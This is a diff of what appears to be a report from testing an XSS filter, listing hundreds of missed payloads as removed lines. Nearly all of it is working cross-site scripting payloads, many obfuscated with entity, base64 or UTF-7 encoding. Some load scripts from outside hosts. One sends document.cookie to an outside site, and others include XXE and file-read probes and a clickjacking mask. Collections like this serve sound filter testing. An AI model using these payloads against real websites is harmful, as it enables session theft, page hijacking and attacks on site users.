@@ -5,843 +5,843 @@ Missed:         840
 ==================================================
 
 --- MISSED PAYLOADS ---
-&#X000003c
-&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
-<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
-<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
-<div style="font-family:'foo&#10;;color:red;';">XXX
-a=\"get\";
-<link rel=attachment href="file:///etc/passwd">
-"/>
-<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
-<img src=&{document.vulnerable=true;};>
-&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
-<div onmouseover="document.vulnerable=true;">
-&LT;
-data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
-<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
-"title=
-&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
-&#x03c;
-<LAYER SRC="%(scriptlet)s"></LAYER>
-<D3/OnpOinTeReENter=confirm``>click here
-<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
-<![CDATA[ open cdata
-<link rel="stylesheet" href="javascript:document.vulnerable=true;">
-&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
-<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
-<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
-"style=
-&lt;!&#91;endif&#93;--&gt;
-");
-href="data:text/html;base64;charset=utf-7,+AFAASABOAGoAYwBtAGwAdwBkAEQANQBqAGIAMgA1AG0AYQBYAEoAdABLAEQAUQB5AEsAVABzADgATAAzAE4AagBjAG0AbAB3AGQARAA0AD0-"	base64 in UTF-7
-<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
-href=
-<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
-&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-Set.constructor`alert\x28document.domain\x29```
-<svg/onload=alert`INJECTX`>
-setTimeout`alert\x28document.domain\x29`
-javascript:confirm(42)
-<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
-<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
-&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
-<body BACKGROUND="javascript:document.vulnerable=true;">
-<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
-"'><;(24)trela=daolno ;''=/e>'=d
-%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
-prompt(document.domain)
-"'><sc	ript>confirm(42)</script>
-onmouseover=
-<;HTML>;<;BODY>;
-<bgsound src="javascript:document.vulnerable=true;">
-prompt("test")
-<iframe src="javascript:document.vulnerable=true; <
-href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAOwBoAGkAcwB0AG8AcgB5AC4AYgBhAGMAawAoACkAOwA8AC8AcwBjAHIAaQBwAHQAPgAKADwAcwBjAHIAaQBwAHQAPgBjAG8AbgBmAGkAcgBtACgANAAyACkAOwA8AC8AcwBjAHIAaQBwAHQAPg-"	UTF-7 (all)
-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&#x00003c
-<div style="font-family:foo}color=red;">XXX</div>
-')>
-<input type="image" dynsrc="javascript:document.vulnerable=true;">
-&lt;
-<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
-<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
-<div datafld="b" dataformatas="html" datasrc="#X"></div>
-SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
-<img DYNSRC="javascript:document.vulnerable=true;">
-<body onmouseover="print()">
-<svg onload=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='));>
-<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
-<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
-1script3document.vulnerable=true;1/script3
-"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
-exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
-&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
-top[
-<embed src=%(jscript)s></embed>
-onclick=
-<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allowfullscreen></iframe>
-<input onblur=write(XSS) autofocus><input autofocus>
-<x/onmouSeenter=window[`\x61\x6c\x65\x72\x74`]`1337`
-<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
-<img src="http://38.media.tumblr.com/tumblr_m5who6JOEM1rna86e.gif"></img>
-"-eval("window['pro'%2B'mpt'](8)")-"
-<div style="binding: url([link to code]);">
-&#x3C
-")
-<?xml version="1.0">
-<body onload=window.location.assign('https://www.google.com')>
-&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
-&lt
-%3C
-<img SRC='vbscript:document.vulnerable=true;'>
-&#x003C
-<meta
-'">
-jAvas	Cript:confirm(42)
-&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
-<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
-<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
-<object onbeforescriptexecute=confirm(0)>
-"onload
-<svg/ subsoloprivxss \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-"-prompt(8)-"
-INJECTXXXXXXXXXXX "'`();</test>=/* <!-- // #
-&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
-"onmouseover=
-<style>*[{}@import'test.css?]{color: green;}</style>X
-&LT
-http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
-<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
-&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
-<x/onxxx=1
-alt=
-/* INJECTX
-&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
-&#X000003C
-<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
-<img src="blah"onmouseover="document.vulnerable=true;">
-<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
-&#X0003c;
-<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
-<;IMG SRC=";mocha:[code]";>;
-"><iframe src='https://testforiframe.site/'>
-"onerror
-&#x000003c;
-<svg </onload ="1> (_=alert,_(1)) "">
-<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
-&#x03C;
-<html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/><svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html>
-<svg%0Aonauxclick=0;[1].some(confirm)//
-&lt;HTML xmlns:xss&gt;
-<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
-&#x000003C
-U%2bFF1CscriptU%2bFF1E
-&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
-<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
-<svg onload=(alert)(1) >//INJECTX
-&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
-<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
-javascript:prompt(document.cookie)
-&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
-&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
-<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
-alert;pg("XSS")
-exp/*<A STYLE='no\xss:noxss("*//*");
-<A href="javascript%26colon;confirm()">click
-"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
-<style type="text/javascript">document.vulnerable=true;</style>
-&#x003C;
-&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
-<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
-<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
-<x </onxxx=1
-<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
-<;HTML xmlns:xss>;
-&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
-\"+
-<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
-<?xml
-<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
-<;A HREF=";//www.google.com/";>;XSS<;/A>;
-<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
-navigator.vibrate(500)
-confirm(document.domain)
-">
-(alert)(1)
-<![CDATA[ complete cdata ]]>
-<%78 onxxx=1
-&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
-<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
-<div style="[a]color[b]:[c]red">XXX</div>
-<iframe src="http://sn1persecurity.com/.testing/iframe_injection.php?iframe_src=3" height="100%" width="100%"></iframe>//INJECTX
-top['al\145rt'](1)
-<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
-<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
-<form><isindex formaction="javascript&colon;confirm(1)"
-<IFRAME SRC=”http://hacker-site.com/xss.html”>
-<IMG SRC='vbscript:msgbox(\"XSS\")'>
-<STYLE>@import'%(css)s';</STYLE>
-")>
-<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
-<details/open/ontoggle="alert`1`">
-<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
-&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
-<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
-<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
-<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
-<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
-<input value=<><iframe/src=javascript:confirm(1)
-" value=``
-<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
-<;A HREF=";//google";>;XSS<;/A>;
-<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
-&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
-"autof<x>ocus o<x>nfocus=alert<x>(1)//
-<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
-<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
-"onclick=
-<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
-<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
-&#X003C
-crowdshield
-<input onblur=focus() autofocus><input>
-<form><a href="javascript:\u0061lert(1)">X
-&#x0003C
-<x on%78xx=1
-<a href="javascript:
-<br><x id=x>#x
-&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
-<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
-"onload=
-b=\"URL(\\"\";
-&#X3C;
-&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
-&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
-<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
-<x o%6Exxx=1
-<table><TD BACKGROUND="javascript:document.vulnerable=true;">
-><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
-<body style="background-color:red">
-<A HREF="http://0102.0146.0007.00000223/">XSS</A>
-<deTAiLs/open/oNtoGGle=confirm()>
-<svg/onload=%26%23097lert%26lpar;1337)>
-: \');confirm(1);//
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage></svg>
-<x style="behavior:url(%(sct)s)">
-&#X003c;
-&#X0003c
-&#0060
-<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
-&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
-https://brutelogic.com.br/poc.svg
-<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
-<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
-<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>
-&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
-<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
-&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
-&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
-&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
-<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-<A HREF="http://1113982867/">XSS</A>
-<img SRC="javascript:document.vulnerable=true;">
-<a onclick="javascript:document.location='https://crowdshield.com/.testing/iframe_injection.php?cookie='+document.cookie;">INJECTX COOKIE STEALER!</a>
-&#X3c
-&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-<div
---><!-- close/complete comment -->
-${``[class extends[alert``]{}]}
-&lt;/BODY&gt;&lt;/HTML&gt;
-&#0000060
-&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
-<input type=text autofocus onfocus=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))//
-<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
-<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>
-<!doctype html><form><label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label><br><input name="secret" type="password"></form><!-- injection --><svg height="50px"><image xmlns:xlink="http://www.w3.org/1999/xlink"><set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /><set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /><set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /><set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /></image></svg>
-'';!--"<XSS>=&{()}
-<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
-"egal=
-&lt;!--&#91;if gte IE 4&#93;&gt;
-&#39;&#88;&#83;&#83;&#39;&#41;>
-\x3C
-"'><sc\tript>confirm(42)</script>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<D3/OnMouSEenTer=[2].find(confirm)>z
-<;A HREF=";http://google.com/";>;XSS<;/A>;
-"href=
-<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
-"link=
-<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
-<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
-javascript:prompt(42)
-<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-{1==1}"><object+data=javascript%26colon%3b'str1ng'.replace('1',alert)>
-<svg
-&#x2329;script&#x232A;
-<;A HREF=";http://www.google.com./";>;XSS<;/A>;
-<div STYLE="width: expression(document.vulnerable=true);">
-<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
-<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
-<x 1="1"onxxx=1
-<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
-.cookie
-<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
-<img dynsrc="javascript:document.vulnerable=true;">
-<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
-&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
-<div style="font-family:'foo[a];color:red;';">XXX</div>
-&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
-&#60
-<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
-&#X0003C;
-<x style="background:url('x[a];color:red;/*')">XXX</x>
-INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
